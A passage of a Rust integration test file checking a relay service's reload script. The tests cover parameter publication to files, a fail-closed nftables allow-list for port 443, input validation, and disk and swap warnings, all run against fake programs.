        assert_eq!(o.status.code(), Some(2), "{prefix:?} {region}: {}", all(&o));
        assert_eq!(stderr(&o), "ai-env-relay-reload: reload.env: PARAM_PREFIX or REGION missing or malformed\n");
    }
    assert!(!t.path().join("called").exists(), "the fake was run");

    // The runs above stop at the environment check, before any knob is read: the knobs themselves, on the unit's Run.
    let root = t.path().join("root").display().to_string();
    let runs = reload_module(
        t.path(),
        "knobs = {'AI_ENV_RELAY_AWS': 'fake-aws', 'AI_ENV_RELAY_SYSTEMCTL': 'fake-systemctl', 'AI_ENV_RELAY_NFT': 'fake-nft', 'AI_ENV_RELAY_SWAPON': 'fake-swapon', 'AI_ENV_RELAY_WAIT_S': '2'}\n\
         for env in (knobs, dict(knobs, AI_ENV_RELAY_ROOT=sys.argv[2])):\n    \
             r = m.Run(env)\n    \
             print(json.dumps([r.aws, r.systemctl, r.nft, r.swapon, r.wait_s, r.libexec, r.state, r.log, r.peers_nft, r.proc_swaps, r.swapfile]))",
        &[root.as_str()],
    );
    let runs: Vec<Value> = runs.lines().map(|l| serde_json::from_str(l).unwrap()).collect();
    let run = |programs: [&str; 4], wait: u32, r: &str| {
        json!([
            programs[0],
            programs[1],
            programs[2],
            programs[3],
            wait,
            format!("{r}/usr/local/libexec/ai-env-relay"),
            format!("{r}/var/lib/ai-env-relay"),
            format!("{r}/var/log/ai-env-relay/reload.log"),
            format!("{r}/etc/ai-env-relay/peers.nft"),
            format!("{r}/proc/swaps"),
            format!("{r}/swapfile"),
        ])
    };
    assert_eq!(
        runs,
        [run(["aws", "systemctl", "/usr/sbin/nft", "swapon"], 60, ""), run(["fake-aws", "fake-systemctl", "fake-nft", "fake-swapon"], 2, &root)],
        "without the root, then with it"
    );
}

/// I-T59 (R-93, R-96, R-147): `peers` is published as the other lists. PARAMETERS holds seven names, `peers` among the lists
/// and right before `access`, then `tls`, which stays last; its value becomes live/peers.json byte for byte, 0640 (root:ai-env-relay on
/// the instance; ownership is skipped when not root, I-R29), a new value one new file renamed over the old while the
/// other files keep theirs, written before `fetched`; an absent value removes it (the run ok, the relay told), a value
/// not JSON too (the run failed, naming it). reload.log is 0644 after a run under the unit's 077 umask, whether the run
/// made it or an older reload left it 0600.
#[test]
fn the_reload_publishes_peers_as_the_other_lists() {
    let params = reload_py_list("PARAMETERS");
    assert_eq!((params.len(), params.last().map(String::as_str)), (7, Some("tls")), "{params:?}");
    assert_eq!(params.iter().position(|p| p == "peers"), Some(4), "peers right before access and tls: {params:?}");
    assert!(reload_py_list("LISTS").iter().any(|l| l == "peers"));

    let mut w = World::new();
    w.complete();
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert_eq!(text(&w.live("peers.json")), w.value("peers"));
    assert_eq!(mode(&w.live("peers.json")), 0o640);
    let log = w.root().join("var/log/ai-env-relay/reload.log");
    assert_eq!(mode(&log), 0o644, "made by a run under the 077 umask");

    // A new value: one new file, peers.json's alone; the relay told once.
    let inode = |w: &World, f: &str| std::fs::metadata(w.live(f)).unwrap().ino();
    let before: Vec<(&str, u64)> = PUBLISHED.iter().map(|(_, f)| (*f, inode(&w, f))).collect();
    w.set("peers", &peers("203.0.113.7/32"));
    std::fs::set_permissions(&log, std::fs::Permissions::from_mode(0o600)).unwrap();
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert!(ran.line.contains(" changed=peers absent=none "), "{}", ran.line);
    assert_eq!(ran.systemctl, ["is-active ai-env-relay.service", "reload ai-env-relay.service"]);
    assert_eq!((text(&w.live("peers.json")), mode(&w.live("peers.json"))), (w.value("peers"), 0o640));
    for (f, ino) in before {
        assert_eq!(inode(&w, f) != ino, f == "peers.json", "{f}: peers.json alone written again");
    }
    assert_eq!(mode(&log), 0o644, "an older reload's 0600 reload.log made 0644");

    // Absent: removed, the run ok. Not JSON: removed, the run failed, naming it.
    w.delete("peers");
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert!(!w.live("peers.json").exists() && ran.line.contains(" changed=peers absent=peers "), "{}", ran.line);
    assert!(ran.systemctl.contains(&"reload ai-env-relay.service".to_string()), "{:?}", ran.systemctl);
    w.set("peers", &peers("198.51.100.0/24"));
    assert_eq!(w.run(&[]).code, 0);
    assert!(w.live("peers.json").exists());
    w.set("peers", "[{\"cidr\": \"198.51.100.0/24\",");
    let ran = w.run(&[]);
    assert_eq!(ran.code, 1, "{}", ran.line);
    assert!(!w.live("peers.json").exists() && ran.line.contains(" why=peers: not JSON"), "{}", ran.line);

    // One publication's writes, in order: the five lists, peers then access last of them, then tls.pem, and `fetched` after all.
    let t = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(t.path().join("root/var/lib/ai-env-relay/live")).unwrap();
    let values = json!({"artifact": null, "workers": placeholder(1), "grants": placeholder(2), "token-signers": placeholder(3), "peers": peers("198.51.100.0/24"), "access": access(&["g-a"]), "tls": tls_pair("QUFB")});
    let written = reload_module(
        t.path(),
        "written, real = [], m.write\n\
         m.write = lambda run, path, data, mode, group: (written.append(os.path.basename(path)), real(run, path, data, mode, group))\n\
         m.publish(m.Run({'AI_ENV_RELAY_ROOT': sys.argv[2]}), json.loads(sys.argv[3]))\n\
         print(json.dumps(written))",
        &[&t.path().join("root").display().to_string(), &values.to_string()],
    );
    let written: Vec<String> = serde_json::from_str(written.trim()).unwrap();
    assert_eq!(written, ["workers.json", "grants.json", "token-signers.json", "peers.json", "access.json", "tls.pem", "fetched"]);
}

/// I-T67 (R-147, R-144): `access` is published as the other lists, and its absence is no fault. PARAMETERS holds it right
/// before `tls`, LISTS last; the run's one `get-parameters` names it. Never written: `absent=access`, no file, the run ok,
/// the binary installed and the relay up, on every run (B2.3 of the runbook). Its first value: live/access.json byte for
/// byte, 0640, one new file while the others keep theirs, `changed=access absent=none` and the relay told once; an
/// unchanged run tells it nothing. A new value: the same. Deleted: removed, the run ok, the relay told. Refused by the
/// reload (not JSON, over 4096 bytes, not printable ASCII): removed, the run failed naming it and no value, every other
/// list stays as it was and the rest of the run goes on. The relay judges what the reload lets through: a list it refuses
/// still reaches live/.
#[test]
fn the_reload_publishes_access_as_the_other_lists() {
    let params = reload_py_list("PARAMETERS");
    assert_eq!(params[params.len() - 2..], ["access", "tls"], "access right before tls: {params:?}");
    assert_eq!(reload_py_list("LISTS").last().map(String::as_str), Some("access"), "the lists' last");

    let mut w = World::new();
    w.complete();
    w.delete("access");
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert!(ran.line.contains(" changed=workers,grants,token-signers,peers,tls absent=access ") && ran.line.ends_with(" tls=present relay=active"), "{}", ran.line);
    assert!(!w.live("access.json").exists());
    assert_eq!(ran.aws.iter().filter(|l| l.starts_with("ssm ")).cloned().collect::<Vec<_>>(), [GET_PARAMETERS]);
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert!(ran.line.contains(" changed=none absent=access "), "{}", ran.line);
    assert_eq!(ran.systemctl, ["is-active ai-env-relay.service"], "nothing to tell the relay");

    // Its first value: one new file, the relay told once.
    let inode = |w: &World, f: &str| std::fs::metadata(w.live(f)).unwrap().ino();
    let others = PUBLISHED.iter().filter(|(p, _)| *p != "access").map(|(_, f)| *f);
    let before: Vec<(&str, u64)> = others.clone().map(|f| (f, inode(&w, f))).collect();
    w.set("access", &access(&["g-a"]));
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert!(ran.line.contains(" changed=access absent=none "), "{}", ran.line);
    assert_eq!(ran.systemctl, ["is-active ai-env-relay.service", "reload ai-env-relay.service"]);
    assert_eq!((text(&w.live("access.json")), mode(&w.live("access.json"))), (w.value("access"), 0o640));
    for (f, ino) in &before {
        assert_eq!(inode(&w, f), *ino, "{f}: access.json alone written");
    }
    let ran = w.run(&[]);
    assert!(ran.code == 0 && ran.line.contains(" changed=none absent=none "), "{}", ran.line);
    assert_eq!(ran.systemctl, ["is-active ai-env-relay.service"], "an unchanged list tells the relay nothing");

    // A new value: the file replaced, by one new file.
    let ino = inode(&w, "access.json");
    w.set("access", &access(&["g-a", "g-b"]));
    let ran = w.run(&[]);
    assert!(ran.code == 0 && ran.line.contains(" changed=access absent=none "), "{}", ran.line);
    assert_eq!(ran.systemctl, ["is-active ai-env-relay.service", "reload ai-env-relay.service"]);
    assert!(text(&w.live("access.json")) == w.value("access") && inode(&w, "access.json") != ino);

    // Deleted: removed, the run ok, the relay told.
    w.delete("access");
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert!(!w.live("access.json").exists() && ran.line.contains(" changed=access absent=access "), "{}", ran.line);
    assert_eq!(ran.systemctl, ["is-active ai-env-relay.service", "reload ai-env-relay.service"]);

    // What the reload refuses: removed, the run failed, naming the parameter and no value; nothing else moves.
    let over = format!("[\"{}\"]", "0".repeat(4094));
    let not_ascii = format!("{}\u{0}", access(&["g-a"]));
    let unfinished = access(&["g-a"]).replace("]", "");
    for (value, why) in [(unfinished.as_str(), "access: not JSON"), (over.as_str(), "access: over 4096 bytes"), (not_ascii.as_str(), "access: not printable ASCII")] {
        w.set("access", &access(&["g-a"]));
        assert_eq!(w.run(&[]).code, 0);
        let before: Vec<(&str, u64)> = others.clone().map(|f| (f, inode(&w, f))).collect();
        w.set("access", value);
        let ran = w.run(&[]);
        assert_eq!(ran.code, 1, "{why}: {}", ran.line);
        assert!(!w.live("access.json").exists() && ran.line.contains(&format!(" why={why}")) && ran.line.contains(" changed=access absent=none "), "{why}: {}", ran.line);
        assert_eq!(ran.systemctl, ["is-active ai-env-relay.service", "reload ai-env-relay.service"], "{why}: the relay told, and never restarted");
        for (f, ino) in &before {
            assert_eq!(inode(&w, f), *ino, "{why}: {f} stays");
        }
    }

    // Alone: a list the reload refuses stops nothing after it. `fetched` is stamped and the TLS pair, published next, moves.
    w.set("access", &access(&["g-a"]));
    assert_eq!(w.run(&[]).code, 0);
    w.set("access", "{");
    w.set("tls", &tls_pair("QkJC"));
    let ran = w.run(&[]);
    assert_eq!(ran.code, 1, "{}", ran.line);
    assert!(ran.line.contains(" changed=access,tls absent=none ") && ran.line.contains(" why=access: not JSON") && !ran.line.contains(" fetched=none "), "{}", ran.line);
    assert_eq!(text(&w.live("tls.pem")), w.value("tls"));

    // What only the relay refuses (R-143): JSON, published byte for byte, and judged there.
    w.set("access", &placeholder(4));
    let ran = w.run(&[]);
    assert!(ran.code == 0 && ran.line.contains(" changed=access absent=none "), "{}", ran.line);
    assert_eq!(text(&w.live("access.json")), w.value("access"));
    assert!(ai_env_worker::policy::parse_access(&w.value("access")).is_err(), "a value R-143 refuses");
}

/// I-T61 (R-95): a root volume over 90 % full (the runs' `statvfs` stub) puts `disk` first in the run line's `why=`
/// list and does nothing more: with nothing else failed the run is `ok`, exits 0 and prunes (a binary beyond current
/// and previous is removed); with a failure the list is `disk; <the failure>`, the run FAILED as the failure makes it.
/// At 90 % and 89 % no `disk`. reload.log carries the word too (`relay status` reads it there, §RS.3.2 row 4).
#[test]
fn the_reload_says_why_disk() {
    let mut w = World::new();
    w.complete();
    assert_eq!(w.run(&[]).code, 0);
    let stale = w.libexec("ai-env-relay-00000000000000aa");
    std::fs::write(&stale, b"an older relay").unwrap();
    w.disk = 91;
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert!(ran.line.starts_with("ai-env-relay-reload: ok ") && ran.line.ends_with(" relay=active why=disk"), "{}", ran.line);
    assert!(!stale.exists(), "pruned: disk fails nothing");
    w.set("grants", "{");
    let ran = w.run(&[]);
    assert_eq!(ran.code, 1, "{}", ran.line);
    assert!(ran.line.starts_with("ai-env-relay-reload: FAILED ") && ran.line.ends_with(" why=disk; grants: not JSON"), "{}", ran.line);
    w.set("grants", &placeholder(2));
    for used in [90, 89] {
        w.disk = used;
        let ran = w.run(&[]);
        assert_eq!(ran.code, 0, "{}", ran.line);
        assert!(!ran.line.contains(" why="), "{used} %: {}", ran.line);
    }
    let log = text(&w.root().join("var/log/ai-env-relay/reload.log"));
    assert_eq!(log.lines().filter(|l| l.contains(" why=disk")).count(), 2, "{log}");
}

/// R-94's table with the set line `set`.
fn peers_table(set: &str) -> String {
    format!(
        "table inet ai_env_relay_peers\ndelete table inet ai_env_relay_peers\ntable inet ai_env_relay_peers {{\n    {set}\n    chain input {{\n        type filter hook input priority filter; policy accept;\n        tcp dport 443 tcp flags & (syn | ack) == syn ip saddr != @allowed counter drop\n    }}\n}}\n"
    )
}

/// R-94's set line of no entry: every SYN to 443 drops.
const EMPTY_SET: &str = "set allowed { type ipv4_addr; flags interval; }";

fn set_of(elements: &str) -> String {
    format!("set allowed {{ type ipv4_addr; flags interval; elements = {{ {elements} }} }}")
}

/// I-T60 (R-94, LD-R54): after `publish` every run renders /etc/ai-env-relay/peers.nft (0644) and loads it with `nft -f`.
/// Its elements are the networks of the entries in force, each truncated, sorted, a network inside another left out (a
/// set with `flags interval` refuses it; a lapsed network holds nothing out). No entry in force, an absent value, one
/// not JSON and one with a `cidr` or `not_after` R-86 refuses (a repeated network among them) render the empty set, so
/// every SYN to 443 drops; a list the relay refuses for its label alone keeps its networks. The load runs on every run,
/// changed or not (a reboot empties the kernel, not the file). A failed load adds `peers.nft: <nft's last Error line>` to
/// `why=`, fails the run and stops nothing else. A failed fetch has nothing to publish or render, and is no absent value:
/// the run loads the file as it is, the table a reboot emptied, and none if there is no file yet. A value nested past
/// the parser's limit is one not JSON. Its size counts in the boot object, which has no limit (LD-R56), never in the user
/// data (I-T8).
#[test]
fn the_peers_kernel_set_renders_fail_closed() {
    const LATER: &str = "2099-12-31T23:59:59Z";
    const LAPSED: &str = "2001-01-01T00:00:00Z";
    let mut w = World::new();
    w.complete();

    // Two in force, a lapsed one; out of order, one with host bits.
    w.set("peers", &peer_list(&[("203.0.113.7/32", LATER), ("192.0.2.0/24", LAPSED), ("198.51.100.77/24", LATER)]));
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    let file = w.peers_nft();
    let want = peers_table(&set_of("198.51.100.0/24, 203.0.113.7/32"));
    assert_eq!(text(&file), want, "R-94's text");
    assert_eq!(mode(&file), 0o644);
    assert_eq!(ran.nft, [format!("-f {}", file.display())], "one load of that file");
    let t = w.t.path().to_path_buf();
    assert_eq!(text(&t.join("nft.loaded")), want, "what nft was given");
    assert_eq!(text(&t.join("nft.loaded.peers")), w.value("peers"), "after publish: live/peers.json already holds the value");
    assert!(ran.systemctl.contains(&"restart ai-env-relay.service".to_string()), "{:?}", ran.systemctl);

    // Every run loads, changed or not: a reboot empties the kernel's tables while the file survives. The mode comes back.
    std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o600)).unwrap();
    let again = w.run(&[]);
    assert_eq!((again.code, again.nft.len(), text(&file)), (0, 1, want), "{}", again.line);
    assert_eq!(mode(&file), 0o644);
    assert!(again.line.contains(" changed=none "), "the relay is told nothing of it: {}", again.line);

    // A network inside another is left out, whatever the order; a lapsed one holds nothing out; 0.0.0.0/0 is the one element.
    for (entries, elements) in [
        (vec![("203.0.113.7/32", LATER), ("203.0.113.0/24", LATER)], "203.0.113.0/24"),
        (vec![("203.0.113.0/24", LATER), ("203.0.113.7/32", LATER), ("192.0.2.0/25", LATER), ("192.0.2.128/25", LATER)], "192.0.2.0/25, 192.0.2.128/25, 203.0.113.0/24"),
        (vec![("203.0.113.0/24", LAPSED), ("203.0.113.7/32", LATER)], "203.0.113.7/32"),
        (vec![("198.51.100.0/24", LATER), ("0.0.0.0/0", LATER), ("203.0.113.7/32", LATER)], "0.0.0.0/0"),
    ] {
        w.set("peers", &peer_list(&entries));
        let ran = w.run(&[]);
        assert_eq!(ran.code, 0, "{entries:?}: {}", ran.line);
        assert_eq!(text(&file), peers_table(&set_of(elements)), "{entries:?}");
    }

    // The empty set: no entry in force, [], absent, not JSON, a bad cidr beside a good one, a repeated network.
    let empty = peers_table(EMPTY_SET);
    let good = ("198.51.100.0/24", LATER);
    for (what, value, code) in [
        ("all lapsed", Some(peer_list(&[("198.51.100.0/24", LAPSED)])), 0),
        ("[]", Some("[]".to_string()), 0),
        ("absent", None, 0),
        ("not JSON", Some("[{\"cidr\": \"198.51.100.0/24\",".to_string()), 1),
        // The other two values publish removes: the relay has no list then, and its own check says no_peers.
        ("over 4096 bytes", Some(json!([{"cidr": "198.51.100.0/24", "label": "x".repeat(4096), "not_after": LATER}]).to_string()), 1),
        ("not printable ASCII", Some(json!([{"cidr": "198.51.100.0/24", "label": "caf\u{e9}", "not_after": LATER}]).to_string()), 1),
        ("a bad cidr", Some(peer_list(&[good, ("203.0.113.0/33", LATER)])), 0),
        ("a bad not_after", Some(peer_list(&[good, ("203.0.113.0/24", "2099-02-30T00:00:00Z")])), 0),
        ("a repeated network", Some(peer_list(&[good, ("198.51.100.7/24", LATER)])), 0),
    ] {
        w.set("peers", &peers("192.0.2.0/24"));
        assert_eq!(w.run(&[]).code, 0);
        assert_eq!(text(&file), peers_table(&set_of("192.0.2.0/24")));
        match &value {
            Some(v) => w.set("peers", v),
            None => w.delete("peers"),
        }
        let ran = w.run(&[]);
        assert_eq!(ran.code, code, "{what}: {}", ran.line);
        assert_eq!(text(&file), empty, "{what}: every SYN to 443 drops");
        assert_eq!(ran.nft.len(), 1, "{what}: loaded all the same");
    }

    // A list nested past the parser's limit fits in 4096 bytes: at AL2023's Python (3.9, as the Mac's) a RecursionError,
    // no ValueError. The run still ends in its one line (World::run), with the empty set, whatever its Python makes of it.
    let deep = format!("{}{}", "[".repeat(2000), "]".repeat(2000));
    w.set("peers", &deep);
    let ran = w.run(&[]);
    assert_eq!((text(&file), ran.nft.len()), (empty.clone(), 1), "{}", ran.line);
    assert!(ran.line.contains(" fetched=") && !ran.line.contains(" fetched=none"), "{}", ran.line);
    w.set("artifact", &deep);
    let ran = w.run(&[]);
    assert_eq!((ran.code, ran.nft.len()), (1, 1), "{}", ran.line);
    w.complete();

    // R-86's refusals, one by one, as the relay's own parser takes them (policy::parse_peers), and what is no refusal of
    // a cidr or a not_after.
    let entry = |cidr: Value, not_after: Value| json!([{"cidr": "198.51.100.0/24", "label": "good", "not_after": LATER}, {"cidr": cidr, "label": "other", "not_after": not_after}]).to_string();
    let mut refused: Vec<String> = vec![];
    for cidr in ["203.0.113.0/33", "203.0.113.0", "203.0.113.300/24", "203.0.113.01/24", "203.0.113.0/024", "2001:db8::/32", "example.invalid/24", "203.0.113.0/", "/24", "203.0.113.0/2\u{0664}", "\u{0662}03.0.113.0/24", " 203.0.113.0/24"] {
        refused.push(entry(json!(cidr), json!(LATER)));
    }
    for not_after in ["2099-13-01T00:00:00Z", "2099-02-30T00:00:00Z", "2099-12-31T24:00:00Z", "2099-12-31T23:60:00Z", "2099-12-31T23:59:60Z", "2099-12-31 23:59:59Z", "2099-12-31T23:59:59", "1969-12-31T23:59:59Z", "0000-01-01T00:00:00Z", "2099-12-31T23:59:5\u{0669}Z", "2099-12-31T23:59:59+00:00"] {
        refused.push(entry(json!("203.0.113.0/24"), json!(not_after)));
    }
    refused.extend([entry(json!(5), json!(LATER)), entry(json!(null), json!(LATER)), entry(json!(["203.0.113.0/24"]), json!(LATER)), entry(json!("203.0.113.0/24"), json!(0))]);
    refused.extend(["{}", "null", "5", "\"198.51.100.0/24\"", "[5]", "[[]]", "[{\"label\": \"x\", \"not_after\": \"2099-12-31T23:59:59Z\"}]", "[{\"cidr\": \"203.0.113.0/24\", \"label\": \"x\"}]"].map(String::from));
    let bad_label = json!([{"cidr": "203.0.113.0/24", "label": "no spaces here", "not_after": LATER}, {"cidr": "198.51.100.0/24", "label": "good", "not_after": LATER}]).to_string();
    // What R-86 takes, the reload takes, to the same networks: the edges of a date and of a network; the earliest date lapsed.
    let taken = peer_list(&[("255.255.255.255/32", LATER), ("203.0.113.200/25", "2096-02-29T23:59:59Z"), ("198.51.100.0/24", "1970-01-01T00:00:00Z"), ("0.0.0.0/32", LATER)]);
    let values = Value::Array(refused.iter().map(|v| json!(v)).collect()).to_string();
    let module = tempfile::tempdir().unwrap();
    let got = reload_module(
        module.path(),
        "for v in json.loads(sys.argv[2]) + sys.argv[3:]:\n    print(json.dumps(list(map(str, m.networks(v)))))",
        &[&values, &taken, &bad_label],
    );
    let got: Vec<Value> = got.lines().map(|l| serde_json::from_str(l).unwrap()).collect();
    let parsed = ai_env_worker::policy::parse_peers(&taken).expect("R-86 takes it");
    let mut in_force: Vec<_> = parsed.iter().filter(|p| now() <= p.not_after_unix()).map(|p| p.network()).collect();
    in_force.sort();
    assert_eq!(got[got.len() - 2], json!(in_force.iter().map(|(a, n)| format!("{a}/{n}")).collect::<Vec<_>>()), "the relay's own networks of it");
    assert_eq!(got[got.len() - 2], json!(["0.0.0.0/32", "203.0.113.128/25", "255.255.255.255/32"]));
    for (value, networks) in refused.iter().zip(&got) {
        assert_eq!(networks, &json!([]), "{value}");
        if value.contains("\"other\"") {
            assert!(ai_env_worker::policy::parse_peers(value).is_err(), "R-86 takes what the reload refuses: {value}");
        }
    }
    assert_eq!(got.last(), Some(&json!(["198.51.100.0/24", "203.0.113.0/24"])), "a list the relay refuses for a label alone keeps its networks: the relay then says no_peers");
    assert!(ai_env_worker::policy::parse_peers(&bad_label).is_err(), "the label is one R-86 refuses");
    // The words of a value nested past the limit, on any Python: each of the three parses takes it for one not JSON.
    let nested = reload_module(
        module.path(),
        "def deep(*args, **kwargs):\n    raise RecursionError('maximum recursion depth exceeded')\njson.loads = deep\nprint(m.invalid('peers', '[]'), '|', m.artifact_of('{}')[1], '|', m.networks('[]'))",
        &[],
    );
    assert_eq!(nested.trim(), "not JSON | not JSON | []");

    // A failed load: nft's Error line in `why=` (no value: its next line quotes the file), the run failed and not cut
    // short, the file rendered; nft says the kernel keeps the table it had.
    w.set("peers", &peer_list(&[("203.0.113.0/24", LATER)]));
    let stale = w.libexec("ai-env-relay-00000000000000aa");
    std::fs::write(&stale, b"an older relay").unwrap();
    let ran = w.run(&[("FAKE_NFT_FAIL", "1")]);
    assert_eq!(ran.code, 1, "{}", ran.line);
    let said = format!("peers.nft: {}:4:81-95: Error: conflicting intervals specified", file.display());
    assert!(ran.line.starts_with("ai-env-relay-reload: FAILED ") && ran.line.ends_with(&format!(" relay=active why={said}")), "{}", ran.line);
    assert!(!ran.line.contains("203.0.113"), "never a value: {}", ran.line);
    assert_eq!(ran.nft.len(), 1, "one load, one failure");
    assert_eq!(text(&file), peers_table(&set_of("203.0.113.0/24")));
    assert!(ran.systemctl.contains(&"reload ai-env-relay.service".to_string()), "the relay is told of the new list all the same: {:?}", ran.systemctl);
    assert!(stale.exists(), "a failed run prunes nothing");
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "the next run loads again: {}", ran.line);
    assert_eq!((ran.nft.len(), stale.exists()), (1, false));

    // nft cannot run: named, the run goes on.
    let ran = w.run(&[("AI_ENV_RELAY_NFT", "/nonexistent/nft")]);
    assert_eq!(ran.code, 1, "{}", ran.line);
    assert!(ran.line.contains(" relay=active why=peers.nft: cannot run /nonexistent/nft: No such file or directory"), "{}", ran.line);

    // The file cannot be written: named, nothing loaded, and the relay still comes up: the kernel set never stops it.
    let etc = w.root().join("etc/ai-env-relay");
    std::fs::remove_dir_all(&etc).unwrap();
    let ran = w.run(&[]);
    assert_eq!(ran.code, 1, "{}", ran.line);
    assert!(ran.line.contains(" relay=active why=peers.nft: No such file or directory"), "{}", ran.line);
    assert!(ran.nft.is_empty(), "{:?}", ran.nft);
    std::fs::create_dir_all(&etc).unwrap();

    // A failed fetch publishes nothing and renders nothing, and is no absent value: the file as it is goes back in, the
    // table a reboot emptied. A failed load of it is said after the fetch's failure. No file yet: nothing to load.
    assert_eq!(w.run(&[]).code, 0);
    let before = text(&file);
    let ran = w.run(&[("FAKE_AWS_FAIL_OP", "ssm get-parameters")]);
    assert_eq!(ran.code, 1, "{}", ran.line);
    assert_eq!((ran.nft.as_slice(), text(&file)), (std::slice::from_ref(&format!("-f {}", file.display())), before.clone()));
    assert_eq!(text(&t.join("nft.loaded")), before, "what nft was given");
    assert!(ran.line.contains(" why=get-parameters: ") && !ran.line.contains("peers.nft"), "{}", ran.line);
    let ran = w.run(&[("FAKE_AWS_FAIL_OP", "ssm get-parameters"), ("FAKE_NFT_FAIL", "1")]);
    assert_eq!((ran.code, ran.nft.len(), text(&file)), (1, 1, before), "{}", ran.line);
    assert!(ran.line.contains(" why=get-parameters: ") && ran.line.ends_with(&format!("; {said}")), "{}", ran.line);
    std::fs::remove_file(&file).unwrap();
    let ran = w.run(&[("FAKE_AWS_FAIL_OP", "ssm get-parameters")]);
    assert_eq!(ran.code, 1, "{}", ran.line);
    assert!(ran.nft.is_empty() && !file.exists() && !ran.line.contains("peers.nft"), "{:?} {}", ran.nft, ran.line);
}

/// I-T63 (LD-R57): every run reads /proc/swaps. /swapfile listed: nothing more. Not listed: `swapon /swapfile`, and with
/// that nothing more is said. Still off: `swap` joins `why=` after `disk`, before the failures: no failure, no exit code,
/// the prune goes on. The run whose fetch fails reads it too; a /proc/swaps that cannot be read counts as off; another
/// file listed is not /swapfile.
#[test]
fn the_reload_keeps_the_swap_on() {
    let mut w = World::new();
    w.complete();
    let (swaps, swapfile) = (w.root().join("proc/swaps"), w.root().join("swapfile").display().to_string());
    let listed = format!("{SWAPS_HEADER}{swapfile} file 524284 0 -2\n");
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert!(ran.swapon.is_empty() && !ran.line.contains(" why="), "on: nothing more: {:?} {}", ran.swapon, ran.line);

    // Off, and turned on again.
    std::fs::write(&swaps, SWAPS_HEADER).unwrap();
    let ran = w.run(&[]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert_eq!(ran.swapon, std::slice::from_ref(&swapfile), "swapon /swapfile");
    assert!(!ran.line.contains(" why="), "{}", ran.line);
    assert_eq!(text(&swaps), listed);
    assert!(w.run(&[]).swapon.is_empty(), "on again: nothing more");

    // Off, and it stays off: said, and nothing fails.
    let stale = w.libexec("ai-env-relay-00000000000000aa");
    std::fs::write(&stale, b"an older relay").unwrap();
    std::fs::write(&swaps, SWAPS_HEADER).unwrap();
    let ran = w.run(&[("FAKE_SWAPON_FAIL", "1")]);
    assert_eq!(ran.code, 0, "not a failure: {}", ran.line);
    assert_eq!(ran.swapon.len(), 1);
    assert!(ran.line.starts_with("ai-env-relay-reload: ok ") && ran.line.ends_with(" relay=active why=swap"), "{}", ran.line);
    assert!(!stale.exists(), "pruned: swap fails nothing");
    assert!(text(&w.root().join("var/log/ai-env-relay/reload.log")).lines().last().is_some_and(|l| l.ends_with(" why=swap")), "`make relay-logs` reads it there");

    // After `disk`, before the failures.
    w.disk = 91;
    let ran = w.run(&[("FAKE_SWAPON_FAIL", "1")]);
    assert_eq!(ran.code, 0, "{}", ran.line);
    assert!(ran.line.ends_with(" why=disk; swap"), "{}", ran.line);
    w.set("grants", "{");
    let ran = w.run(&[("FAKE_SWAPON_FAIL", "1")]);
    assert_eq!(ran.code, 1, "{}", ran.line);
    assert!(ran.line.starts_with("ai-env-relay-reload: FAILED ") && ran.line.ends_with(" why=disk; swap; grants: not JSON"), "{}", ran.line);
    w.disk = 50;
    w.set("grants", &placeholder(2));

    // Every run: one whose fetch fails too.
    let ran = w.run(&[("FAKE_SWAPON_FAIL", "1"), ("FAKE_AWS_FAIL_OP", "ssm get-parameters")]);
    assert_eq!((ran.code, ran.swapon.len()), (1, 1), "{}", ran.line);
    assert!(ran.line.contains(" why=swap; get-parameters: "), "{}", ran.line);

    // Unreadable, or another file listed: off.
    std::fs::remove_file(&swaps).unwrap();
    let ran = w.run(&[("FAKE_SWAPON_FAIL", "1")]);
    assert_eq!((ran.code, ran.swapon.len()), (0, 1), "{}", ran.line);
    assert!(ran.line.ends_with(" why=swap"), "{}", ran.line);
    std::fs::write(&swaps, format!("{SWAPS_HEADER}{swapfile}.new file 524284 0 -2\n/dev/nvme0n1p9 partition 524284 0 -3\n")).unwrap();
    let ran = w.run(&[("FAKE_SWAPON_FAIL", "1")]);
    assert_eq!(ran.swapon.len(), 1, "{}", ran.line);
    assert!(ran.line.ends_with(" why=swap"), "{}", ran.line);
}

/// Every absolute path `script` names outside `sys`: a `/` that no path character precedes (so at any boundary, a `^` or a
/// `{` as well as a space or a quote) and the path characters after it. The two URLs' schemes are not paths, and a key's
/// `relay/…` is no absolute path.
fn absolute_paths(script: &str, sys: &str) -> std::collections::BTreeSet<String> {
    let in_path = |c: char| c.is_ascii_alphanumeric() || "._-/".contains(c);
    let scanned: Vec<char> = script.replace(sys, "SYS").replace("https://", "").replace("s3://", "").chars().collect();
    (0..scanned.len())
        .filter(|&i| scanned[i] == '/' && (i == 0 || !in_path(scanned[i - 1])))
        .map(|i| scanned[i..].iter().copied().take_while(|c| in_path(*c)).collect::<String>())
        .collect()
}

/// The first script's world (I-T64): the rendered user data with `/swapfile`, `/etc/fstab` and `/root` under a temporary
/// directory, run by `/bin/bash` with a PATH that finds these fakes first: dd, mkswap and swapon (a list of files in
/// `swaps`), aws (`FAKE_AWS_FAILS` failures, then `object` copied to its last argument), sleep and date (a clock in a
/// file that only sleep moves), timeout (runs the rest) and sha256sum (the Mac has none on this PATH). Each logs to
/// `calls`. It never touches the Mac's real paths: [`Bootstrap::new`] refuses a script that names a system path it knows
/// nothing of, and boot.sh is never what runs: the object is the test's.
struct Bootstrap {
    t: tempfile::TempDir,
    /// The object the user data pins.
    pinned: String,
    script: PathBuf,
}

impl Bootstrap {
    const FAKES: [(&'static str, &'static str); 8] = [
